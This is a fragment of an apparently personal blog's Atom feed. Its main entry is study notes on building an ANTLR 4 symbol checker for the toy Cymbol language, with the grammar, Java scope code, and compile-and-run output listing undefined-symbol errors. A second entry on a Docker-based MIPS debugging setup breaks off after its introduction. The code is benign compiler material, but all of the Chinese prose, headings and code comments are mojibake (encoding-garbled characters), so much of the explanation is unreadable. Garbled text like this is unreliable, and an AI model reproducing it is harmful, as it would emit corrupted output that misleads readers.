    <content type="html"><![CDATA[<h4 id="0x00ï¼šä»‹ç»"><a href="#0x00ï¼šä»‹ç»" class="headerlink" title="0x00ï¼šä»‹ç»"></a>0x00ï¼šä»‹ç»</h4><p>Antlr 4 æ˜¯ä¸€ä¸ªå¼ºå¤§çš„è¯­æ³•åˆ†æå™¨ç”Ÿæˆå·¥å…·ï¼Œå¯ä»¥ç”¨æ¥è¯»å–ã€å¤„ç†ã€æ‰§è¡Œå’Œè½¬æ¢ç»“æ„åŒ–æ–‡æœ¬æˆ–äºŒè¿›åˆ¶æ–‡ä»¶ã€‚é€šè¿‡ç§°ä¸ºæ–‡æ³•çš„å½¢å¼åŒ–è¯­è¨€æè¿°ï¼ŒANTLRå¯ä»¥ä¸ºè¯¥è¯­è¨€è‡ªåŠ¨ç”Ÿæˆè¯æ³•åˆ†æå™¨ã€‚ç”Ÿæˆçš„è¯­æ³•åˆ†æå™¨å¯ä»¥è‡ªåŠ¨æ„å»ºè¯­æ³•åˆ†ææ ‘ï¼Œå®ƒæ˜¯è¡¨ç¤ºæ–‡æ³•å¦‚ä½•åŒ¹é…è¾“å…¥çš„æ•°æ®ç»“æ„ã€‚ANTLRè¿˜å¯ä»¥è‡ªåŠ¨ç”Ÿæˆæ ‘éå†å™¨ï¼Œç”¨æ¥è®¿é—®æ ‘èŠ‚ç‚¹ä»¥æ‰§è¡Œç‰¹å®šçš„ä»£ç ã€‚</p>
<a id="more"></a>
<h4 id="0x01-why-thisï¼Ÿ"><a href="#0x01-why-thisï¼Ÿ" class="headerlink" title="0x01: why thisï¼Ÿ"></a>0x01: why thisï¼Ÿ</h4><p>æˆ‘ä¸€ç›´è§‰å¾—ç¼–è¯‘åŸç†ç›¸å…³çš„ä¸œè¥¿ï¼ˆç†è®ºä¹Ÿå¥½ï¼Œå·¥å…·ä¹Ÿå¥½ï¼‰å¯ä»¥å’Œæ¼æ´æŒ–æ˜å‘ç”Ÿå¥‡å¦™çš„åŒ–å­¦ååº”ã€‚å’Œ9kå¸ˆå‚…èŠè¿‡ç›¸å…³çš„ä¸œè¥¿ï¼Œæœ‰ç±»ä¼¼æƒ³æ³•çš„äººå¾ˆå¤šã€‚ç”šè‡³<code>github</code>ä¸Šå…­å¹´å‰çš„ä¸€ä¸ªé¡¹ç›®ï¼Œä½¿ç”¨<code>flex+bison</code>å»ç”Ÿæˆæ–‡ä»¶æ¥åš<code>fuzz</code>ã€‚</p>
<p>å’Œ<code>flex+bison</code>æ¯”è¾ƒï¼Œantlr4æ— ç–‘æ˜¯æ›´å®¹æ˜“ä¸Šæ‰‹ï¼Œä¹Ÿæ›´åŠ å¼ºå¤§çš„ï¼Œå½“ç„¶ç”¨å“ªä¸ªå°±æ˜¯ä»è€…è§ä»æ™ºè€…è§æ™ºäº†ã€‚</p>
<p>åœ¨æ·±å…¥å­¦ä¹ è¿™äº›ä¸œè¥¿ä¹‹åï¼Œå¯¹domatoçš„æ€æƒ³æœ‰äº†æ›´æ·±åˆ»çš„ç†è§£ã€‚å…¶å®å°±æ˜¯è¯æ³•åˆ†æé‚£å¥—ï¼Œè‡ªé¡¶å‘ä¸‹çš„ã€‚ä¸å¾—ä¸è¯´ï¼ŒçœŸçš„å¾ˆæ£’ï¼Œè€Œä¸”åº”ç”¨èŒƒå›´å¾ˆå¹¿æ³›ï¼Œä½†æ˜¯æ•ˆæœæ€ä¹ˆæ ·æˆ‘å°±ä¸çŸ¥é“äº†ï¼Œè¿˜åœ¨æ‘¸ç´¢ã€‚</p>
<h4 id="0x02ï¼š-å…³äºæœ¬æ–‡"><a href="#0x02ï¼š-å…³äºæœ¬æ–‡" class="headerlink" title="0x02ï¼š å…³äºæœ¬æ–‡"></a>0x02ï¼š å…³äºæœ¬æ–‡</h4><p>ã€ŠAntlr4æƒå¨æŒ‡å—ã€‹ä¸­8.4ç« èŠ‚ç»ƒä¹ çš„å­¦ä¹ è®°å½•ã€‚è¿™éƒ¨åˆ†çš„ä¾‹å­æ˜¯ä¸€ä¸ªè¯­æ³•æ£€æŸ¥å™¨ï¼Œé’ˆå¯¹<code>Cymbol</code>è¯­è¨€çš„ã€‚</p>
<p>æ¯”å¦‚ä¸‹é¢çš„ä»£ç ï¼š</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">f</span><span class="params">(<span class="keyword">int</span> x, <span class="keyword">float</span> y)</span> </span>&#123;</span><br><span class="line">    g();   <span class="comment">// forward reference is ok</span></span><br><span class="line">    i = <span class="number">3</span>; <span class="comment">// no declaration for i (error)</span></span><br><span class="line">    g = <span class="number">4</span>; <span class="comment">// g is not variable (error)</span></span><br><span class="line">    <span class="keyword">return</span> x + y; <span class="comment">// x, y are defined, so no problem</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">g</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">int</span> x = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">float</span> y;</span><br><span class="line">    y = <span class="number">9</span>; <span class="comment">// y is defined</span></span><br><span class="line">    f();   <span class="comment">// backward reference is ok</span></span><br><span class="line">    z();   <span class="comment">// no such function (error)</span></span><br><span class="line">    y();   <span class="comment">// y is not function (error)</span></span><br><span class="line">    x = f; <span class="comment">// f is not a variable (error)</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>ç»è¿‡è¯¥è¯­æ³•æ£€æŸ¥å™¨ï¼Œå¯ä»¥å°†ä¸€äº›è¯­æ³•é”™è¯¯æ‰¾å‡ºæ¥ï¼Œæ¯”å¦‚æœªå®šä¹‰çš„ç¬¦å·ã€ç±»å‹å¼•ç”¨é”™è¯¯(å‡½æ•°å½“å˜é‡ï¼Œå˜é‡å½“å‡½æ•°)ã€‚</p>
<h4 id="0x03-ä¾‹å­"><a href="#0x03-ä¾‹å­" class="headerlink" title="0x03: ä¾‹å­"></a>0x03: ä¾‹å­</h4><h5 id="1-è¯­æ³•åˆ†æ"><a href="#1-è¯­æ³•åˆ†æ" class="headerlink" title="1. è¯­æ³•åˆ†æ"></a>1. è¯­æ³•åˆ†æ</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br></pre></td><td class="code"><pre><span class="line">/** Simple statically-typed programming language with functions and variables</span><br><span class="line"> *  taken from &quot;Language Implementation Patterns&quot; book.</span><br><span class="line"> */</span><br><span class="line">grammar Cymbol;</span><br><span class="line"></span><br><span class="line">file:   (functionDecl | varDecl)+ ;</span><br><span class="line"></span><br><span class="line">varDecl</span><br><span class="line">    :   type ID (&apos;=&apos; expr)? &apos;;&apos;</span><br><span class="line">    ;</span><br><span class="line">type:   &apos;float&apos; | &apos;int&apos; | &apos;void&apos; ; // user-defined types</span><br><span class="line"></span><br><span class="line">functionDecl</span><br><span class="line">    :   type ID &apos;(&apos; formalParameters? &apos;)&apos; block // &quot;void f(int x) &#123;...&#125;&quot;</span><br><span class="line">    ;</span><br><span class="line"></span><br><span class="line">formalParameters</span><br><span class="line">    :   formalParameter (&apos;,&apos; formalParameter)*</span><br><span class="line">    ;</span><br><span class="line">formalParameter</span><br><span class="line">    :   type ID</span><br><span class="line">    ;</span><br><span class="line"></span><br><span class="line">block:  &apos;&#123;&apos; stat* &apos;&#125;&apos; ;   // possibly empty statement block</span><br><span class="line"></span><br><span class="line">stat:   block</span><br><span class="line">    |   varDecl</span><br><span class="line">    |   &apos;if&apos; expr &apos;then&apos; stat (&apos;else&apos; stat)?</span><br><span class="line">    |   &apos;return&apos; expr? &apos;;&apos; </span><br><span class="line">    |   expr &apos;=&apos; expr &apos;;&apos; // assignment</span><br><span class="line">    |   expr &apos;;&apos;          // func call</span><br><span class="line">    ;</span><br><span class="line"></span><br><span class="line">/* expr below becomes the following non-left recursive rule:</span><br><span class="line">expr[int _p]</span><br><span class="line">    :   ( &apos;-&apos; expr[6]</span><br><span class="line">        | &apos;!&apos; expr[5]</span><br><span class="line">        | ID</span><br><span class="line">        | INT</span><br><span class="line">        | &apos;(&apos; expr &apos;)&apos;</span><br><span class="line">        )</span><br><span class="line">        ( &#123;8 &gt;= $_p&#125;? &apos;*&apos; expr[9]</span><br><span class="line">        | &#123;7 &gt;= $_p&#125;? (&apos;+&apos;|&apos;-&apos;) expr[8]</span><br><span class="line">        | &#123;4 &gt;= $_p&#125;? &apos;==&apos; expr[5]</span><br><span class="line">        | &#123;10 &gt;= $_p&#125;? &apos;[&apos; expr &apos;]&apos;</span><br><span class="line">        | &#123;9 &gt;= $_p&#125;? &apos;(&apos; exprList? &apos;)&apos;</span><br><span class="line">        )*</span><br><span class="line">    ;</span><br><span class="line">*/</span><br><span class="line"></span><br><span class="line">expr:   ID &apos;(&apos; exprList? &apos;)&apos;    # Call</span><br><span class="line">    |   expr &apos;[&apos; expr &apos;]&apos;       # Index</span><br><span class="line">    |   &apos;-&apos; expr                # Negate</span><br><span class="line">    |   &apos;!&apos; expr                # Not</span><br><span class="line">    |   expr &apos;*&apos; expr           # Mult</span><br><span class="line">    |   expr (&apos;+&apos;|&apos;-&apos;) expr     # AddSub</span><br><span class="line">    |   expr &apos;==&apos; expr          # Equal</span><br><span class="line">    |   ID                      # Var</span><br><span class="line">    |   INT                     # Int</span><br><span class="line">    |   &apos;(&apos; expr &apos;)&apos;            # Parens</span><br><span class="line">    ;</span><br><span class="line"></span><br><span class="line">exprList : expr (&apos;,&apos; expr)* ;   // arg list</span><br><span class="line"></span><br><span class="line">K_FLOAT : &apos;float&apos;;</span><br><span class="line">K_INT   : &apos;int&apos;;</span><br><span class="line">K_VOID  : &apos;void&apos;;</span><br><span class="line">ID  :   LETTER (LETTER | [0-9])* ;</span><br><span class="line">fragment</span><br><span class="line">LETTER : [a-zA-Z] ;</span><br><span class="line"></span><br><span class="line">INT :   [0-9]+ ;</span><br><span class="line"></span><br><span class="line">WS  :   [ \t\n\r]+ -&gt; skip ;</span><br><span class="line"></span><br><span class="line">SL_COMMENT</span><br><span class="line">    :   &apos;//&apos; .*? &apos;\n&apos; -&gt; skip</span><br><span class="line">    ;</span><br></pre></td></tr></table></figure>
<h5 id="2-ç¬¦å·è¡¨"><a href="#2-ç¬¦å·è¡¨" class="headerlink" title="2. ç¬¦å·è¡¨"></a>2. ç¬¦å·è¡¨</h5><p>è¿™éƒ¨åˆ†æ˜¯ç²¾é«“ï¼Œä½œè€…ç›´æ¥æ‹¿äº†è‡ªå·±å¦ä¸€æœ¬ä¹¦é‡Œçš„ä»£ç æ¥ç”¨ï¼Œä»£ç ä¸é•¿ä¹Ÿå¥½æ‡‚ã€‚è¿™é‡Œæˆ‘åªåˆ—ä¸€éƒ¨åˆ†æ¯”è¾ƒé‡è¦çš„ï¼š</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">abstract</span> <span class="class"><span class="keyword">class</span> <span class="title">BaseScope</span> <span class="keyword">implements</span> <span class="title">Scope</span> </span>&#123;</span><br><span class="line">    Scope enclosingScope; <span class="comment">// ä¸´è¿‘çš„ä½œç”¨åŒºï¼Œå¦‚æœå½“å‰æ˜¯å…¨å±€ä½œç”¨åŸŸï¼Œåº”è¯¥ç½®null</span></span><br><span class="line">                          <span class="comment">// å› ä¸ºä½œç”¨åŸŸæŸ¥æ‰¾æ˜¯å¾€å‰æ‰¾çš„ï¼Œå…¨å±€å·²ç»æ˜¯æœ€é å‰äº†</span></span><br><span class="line">    Map&lt;String, Symbol&gt; symbols = <span class="keyword">new</span> LinkedHashMap&lt;String, Symbol&gt;();</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">BaseScope</span><span class="params">(Scope enclosingScope)</span> </span>&#123; <span class="keyword">this</span>.enclosingScope = enclosingScope;  &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> Symbol <span class="title">resolve</span><span class="params">(String name)</span> </span>&#123;</span><br><span class="line">        Symbol s = symbols.get(name);</span><br><span class="line">        <span class="keyword">if</span> ( s!=<span class="keyword">null</span> ) <span class="keyword">return</span> s;<span class="comment">//åœ¨å½“å‰ä½œç”¨åŸŸæ‰¾åˆ°äº†ï¼Œç›´æ¥è¿”å›</span></span><br><span class="line">        <span class="comment">//å¦‚æœä¸´è¿‘ä½œç”¨åŸŸä¸ç©ºï¼Œé‚£ä¹ˆå°±å»ä¸´è¿‘ä½œç”¨åŸŸæ‰¾</span></span><br><span class="line">        <span class="comment">//æ¯”å¦‚ï¼Œä¸€ä¸ªå‡½æ•°å†…ï¼Œç¬¦å·å®šä¹‰æ²¡æ‰¾åˆ°ï¼Œå°±å»å¾€ä¸Šï¼ˆå…¨å±€ï¼‰æ‰¾</span></span><br><span class="line">        <span class="keyword">if</span> ( enclosingScope != <span class="keyword">null</span> ) <span class="keyword">return</span> enclosingScope.resolve(name);</span><br><span class="line">        <span class="comment">//è¿˜æ‰¾ä¸åˆ°ï¼Œé‚£å°±æ˜¯æœªå®šä¹‰ï¼ŒæŠ¥é”™</span></span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">null</span>; <span class="comment">// not found</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">define</span><span class="params">(Symbol sym)</span> </span>&#123;</span><br><span class="line">        symbols.put(sym.name, sym);</span><br><span class="line">        sym.scope = <span class="keyword">this</span>; <span class="comment">// track the scope in each symbol</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> Scope <span class="title">getEnclosingScope</span><span class="params">()</span> </span>&#123; <span class="keyword">return</span> enclosingScope; &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">toString</span><span class="params">()</span> </span>&#123; <span class="keyword">return</span> getScopeName()+<span class="string">":"</span>+symbols.keySet().toString(); &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h5 id="3-å¦‚ä½•æ£€æŸ¥"><a href="#3-å¦‚ä½•æ£€æŸ¥" class="headerlink" title="3. å¦‚ä½•æ£€æŸ¥"></a>3. å¦‚ä½•æ£€æŸ¥</h5><p>å› ä¸ºç›®æ ‡è¯­è¨€<code>Cymbol</code>å…è®¸å‘å‰å¼•ç”¨ï¼Œæ¯”å¦‚ï¼š</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">f</span><span class="params">()</span></span>&#123;</span><br><span class="line">    g();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">g</span><span class="params">()</span></span>&#123;</span><br><span class="line">    ;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>æ‰€ä»¥éœ€è¦ä¸¤æ¬¡éå†ï¼Œç¬¬ä¸€æ¬¡æ‰¾åˆ°æ‰€æœ‰å®šä¹‰ï¼Œå¹¶æ”¾å…¥ç¬¦å·è¡¨ï¼Œå°†ç¬¦å·è¡¨æ„é€ å¥½ã€‚<br>æ¥ä¸‹æ¥è¿›è¡Œç¬¬äºŒæ¬¡éå†ï¼Œè¿™æ—¶é‡åˆ°ä¸€ä¸ªå¼•ç”¨ï¼Œå°±å»æ‰¾ç¬¦å·è¡¨ï¼Œæ‰¾åˆ°äº†å°±æ˜¯æ­£å¸¸ï¼Œæ‰¾ä¸åˆ°å°±æ˜¯æœ‰é—®é¢˜ã€‚</p>
<h5 id="4-ä»£ç "><a href="#4-ä»£ç " class="headerlink" title="4. ä»£ç "></a>4. ä»£ç </h5><p>ä¸»è¦æ˜¯ä¸¤ä¸ªæ–‡ä»¶ï¼Œ<code>DefPhase.java</code>å’Œ<code>RefPhase.java</code>ã€‚</p>
<h6 id="1-Defphase"><a href="#1-Defphase" class="headerlink" title="1. Defphase"></a>1. Defphase</h6><p>å…³é”®çš„é—®é¢˜ï¼šåœ¨ç¬¬ä¸€æ¬¡éå†æ„é€ ç¬¦å·è¡¨çš„æ—¶å€™ï¼Œé‡åˆ°æ–°çš„ä½œç”¨åŸŸï¼Œéœ€è¦æŠŠæ–°çš„ä½œç”¨åŸŸçš„çˆ¶ä½œç”¨åŸŸè®¾ç½®ä¸ºå½“å‰ä½œç”¨åŸŸï¼Œå¹¶ä¸”æŠŠæ–°çš„ä½œç”¨åŸŸè®¾ç½®ä¸ºå½“å‰ä½œç”¨åŸŸã€‚</p>
<p>å¯¹äºé‡åˆ°çš„å˜é‡å®šä¹‰ç›´æ¥ä½¿ç”¨å¯¹åº”çš„æ„é€ ç¬¦å·è¡¨çš„å¯¹è±¡å»æ„é€ å°±å¥½äº†ã€‚</p>
<h6 id="2-RefPhase"><a href="#2-RefPhase" class="headerlink" title="2. RefPhase"></a>2. RefPhase</h6><p>éå†æ£€æŸ¥æ¯ä¸ªå¼•ç”¨éƒ¨åˆ†ï¼Œå»ç¬¦å·è¡¨é‡ŒæŸ¥æ‰¾ï¼Œæ‰¾ä¸åˆ°å°±æŠ¥é”™ã€‚è¿™éƒ¨åˆ†æ¯”è¾ƒç®€å•ã€‚</p>
<h5 id="3-checkSymbol"><a href="#3-checkSymbol" class="headerlink" title="3. checkSymbol"></a>3. checkSymbol</h5><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">parser.setBuildParseTree(<span class="keyword">true</span>);</span><br><span class="line">ParseTree tree = parser.file();</span><br><span class="line"><span class="comment">// show tree in text form</span></span><br><span class="line"><span class="comment">//System.out.println(tree.toStringTree(parser));</span></span><br><span class="line"></span><br><span class="line">ParseTreeWalker walker = <span class="keyword">new</span> ParseTreeWalker();</span><br><span class="line">DefPhase def = <span class="keyword">new</span> DefPhase();</span><br><span class="line">walker.walk(def, tree);</span><br><span class="line"><span class="comment">// create next phase and feed symbol table info from def to ref phase</span></span><br><span class="line">RefPhase ref = <span class="keyword">new</span> RefPhase(def.globals, def.scopes);</span><br><span class="line">walker.walk(ref, tree);</span><br></pre></td></tr></table></figure>
<h5 id="5-ç»“æœ"><a href="#5-ç»“æœ" class="headerlink" title="5. ç»“æœ"></a>5. ç»“æœ</h5><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># muhe @ muheMacBookPro in ~/Study/antlr_study/chapter_8_4 [16:03:46]</span></span><br><span class="line">$ antlr4 Cymbol.g4</span><br><span class="line"></span><br><span class="line"><span class="comment"># muhe @ muheMacBookPro in ~/Study/antlr_study/chapter_8_4 [16:03:49]</span></span><br><span class="line">$ javac Cymbol*.java CheckSymbols.java *Phase.java *Scope.java *Symbol.java -Xlint:deprecation</span><br><span class="line">CheckSymbols.java:9: è­¦å‘Š: [deprecation] org.antlr.v4.runtimeä¸­çš„ANTLRInputStreamå·²è¿‡æ—¶</span><br><span class="line">import org.antlr.v4.runtime.ANTLRInputStream;</span><br><span class="line">                           ^</span><br><span class="line">CheckSymbols.java:40: è­¦å‘Š: [deprecation] org.antlr.v4.runtimeä¸­çš„ANTLRInputStreamå·²è¿‡æ—¶</span><br><span class="line">        ANTLRInputStream input = new ANTLRInputStream(is);</span><br><span class="line">        ^</span><br><span class="line">CheckSymbols.java:40: è­¦å‘Š: [deprecation] org.antlr.v4.runtimeä¸­çš„ANTLRInputStreamå·²è¿‡æ—¶</span><br><span class="line">        ANTLRInputStream input = new ANTLRInputStream(is);</span><br><span class="line">                                     ^</span><br><span class="line">3 ä¸ªè­¦å‘Š</span><br><span class="line"></span><br><span class="line"><span class="comment"># muhe @ muheMacBookPro in ~/Study/antlr_study/chapter_8_4 [16:03:56]</span></span><br><span class="line">$ java CheckSymbols vars.cymbol</span><br><span class="line">locals:[]</span><br><span class="line"><span class="keyword">function</span>&lt;f:tINT&gt;:[&lt;x:tINT&gt;, &lt;y:tFLOAT&gt;]</span><br><span class="line">locals:[x, y]</span><br><span class="line"><span class="keyword">function</span>&lt;g:tVOID&gt;:[]</span><br><span class="line">globals:[f, g]</span><br><span class="line">line 3:4 no such variable: i</span><br><span class="line">line 4:4 g is not a variable</span><br><span class="line">line 13:4 no such <span class="keyword">function</span>: z</span><br><span class="line">line 14:4 y is not a <span class="keyword">function</span></span><br><span class="line">line 15:8 f is not a variable</span><br></pre></td></tr></table></figure>
<h4 id="0x04ï¼š-å¼•ç”¨"><a href="#0x04ï¼š-å¼•ç”¨" class="headerlink" title="0x04ï¼š å¼•ç”¨"></a>0x04ï¼š å¼•ç”¨</h4><p>ã€Šantlr4æƒå¨æŒ‡å—ã€‹</p>
]]></content>
    
    <summary type="html">
    
      &lt;h4 id=&quot;0x00ï¼šä»‹ç»&quot;&gt;&lt;a href=&quot;#0x00ï¼šä»‹ç»&quot; class=&quot;headerlink&quot; title=&quot;0x00ï¼šä»‹ç»&quot;&gt;&lt;/a&gt;0x00ï¼šä»‹ç»&lt;/h4&gt;&lt;p&gt;Antlr 4 æ˜¯ä¸€ä¸ªå¼ºå¤§çš„è¯­æ³•åˆ†æå™¨ç”Ÿæˆå·¥å…·ï¼Œå¯ä»¥ç”¨æ¥è¯»å–ã€å¤„ç†ã€æ‰§è¡Œå’Œè½¬æ¢ç»“æ„åŒ–æ–‡æœ¬æˆ–äºŒè¿›åˆ¶æ–‡ä»¶ã€‚é€šè¿‡ç§°ä¸ºæ–‡æ³•çš„å½¢å¼åŒ–è¯­è¨€æè¿°ï¼ŒANTLRå¯ä»¥ä¸ºè¯¥è¯­è¨€è‡ªåŠ¨ç”Ÿæˆè¯æ³•åˆ†æå™¨ã€‚ç”Ÿæˆçš„è¯­æ³•åˆ†æå™¨å¯ä»¥è‡ªåŠ¨æ„å»ºè¯­æ³•åˆ†ææ ‘ï¼Œå®ƒæ˜¯è¡¨ç¤ºæ–‡æ³•å¦‚ä½•åŒ¹é…è¾“å…¥çš„æ•°æ®ç»“æ„ã€‚ANTLRè¿˜å¯ä»¥è‡ªåŠ¨ç”Ÿæˆæ ‘éå†å™¨ï¼Œç”¨æ¥è®¿é—®æ ‘èŠ‚ç‚¹ä»¥æ‰§è¡Œç‰¹å®šçš„ä»£ç ã€‚&lt;/p&gt;
    
    </summary>
    
    
      <category term="ç¼–è¯‘åŸç†" scheme="http://o0xmuhe.me/tags/%E7%BC%96%E8%AF%91%E5%8E%9F%E7%90%86/"/>
    
      <category term="Antlr" scheme="http://o0xmuhe.me/tags/Antlr/"/>
    
  </entry>
  
  <entry>
    <title>mipsç¨‹åºè°ƒè¯•ç¯å¢ƒæŠ˜è…¾</title>
    <link href="http://o0xmuhe.me/2018/04/19/mips%E7%A8%8B%E5%BA%8F%E8%B0%83%E8%AF%95%E7%8E%AF%E5%A2%83%E6%8A%98%E8%85%BE/"/>
    <id>http://o0xmuhe.me/2018/04/19/mipsç¨‹åºè°ƒè¯•ç¯å¢ƒæŠ˜è…¾/</id>
    <published>2018-04-18T18:56:38.000Z</published>
    <updated>2018-04-19T06:25:55.429Z</updated>
    
    <content type="html"><![CDATA[<h4 id="0x00-èµ·å› "><a href="#0x00-èµ·å› " class="headerlink" title="0x00 : èµ·å› "></a>0x00 : èµ·å› </h4><p>æ¯”èµ›é‡åˆ°äº†ï¼Œå¸®å­¦å¼ŸæŠ˜è…¾è°ƒè¯•ç¯å¢ƒï¼Œä¸­é—´è¸©å‘æ— æ•°ï¼Œä½†æ˜¯æœ€åè¿˜æ˜¯è§£å†³äº†ï¼Œå°±è®°å½•ä¸‹ã€‚</p>
<a id="more"></a>
<h4 id="0x01-æœ€åˆå°è¯•"><a href="#0x01-æœ€åˆå°è¯•" class="headerlink" title="0x01 : æœ€åˆå°è¯•"></a>0x01 : æœ€åˆå°è¯•</h4><p>æœ€åˆå°è¯•åœ¨Linuxè™šæ‹Ÿæœºé‡Œï¼Œqemu + gdbserverçš„æäº‹æƒ…ï¼Œä½†æ˜¯ï¼Œä¾èµ–é—®é¢˜å¤ªé—¹å¿ƒäº†ï¼Œå„ç§äº¤å‰ç¼–è¯‘çš„è›‹ç–¼äº‹æƒ…ã€‚</p>
<p>æ‰€ä»¥å°±æ”¾å¼ƒäº†ã€‚</p>
<h4 id="0x02-dockerä¸“æ²»ç¯å¢ƒæ­å»º"><a href="#0x02-dockerä¸“æ²»ç¯å¢ƒæ­å»º" class="headerlink" title="0x02 : dockerä¸“æ²»ç¯å¢ƒæ­å»º"></a>0x02 : dockerä¸“æ²»ç¯å¢ƒæ­å»º</h4><p>åæ¥æƒ³äº†æƒ³ï¼Œæˆ‘ä¸ºå•¥ä¸ç”¨dockerç¥å™¨ï¼Œè‚¯å®šæœ‰äººå’Œæˆ‘ä¸€æ ·ä¸æƒ³å¼„äº¤å‰ç¼–è¯‘ç¯å¢ƒï¼Œæ‰€ä»¥è‚¯å®šæäº†è¿™æ ·çš„é•œåƒï½</p>
<p>Googleæœç´¢ä¸€å¤§å †ä¹‹åï¼š</p>
<ol>
<li><p><a href="https://hub.docker.com/r/skysider/multiarch-docker/" target="_blank" rel="noopener">multiarch-docker</a></p>
</li>
<li><p><a href="https://hub.docker.com/r/blukat29/cross/" target="_blank" rel="noopener">cross</a></p>
</li>
</ol>
<p>è¿™ä¸¤ä¸ªè¿˜ä¸é”™ï¼Œæˆ‘é€‰æ‹©äº†ç¬¬ä¸€ä¸ªæ¥ä½¿ç”¨ã€‚</p>
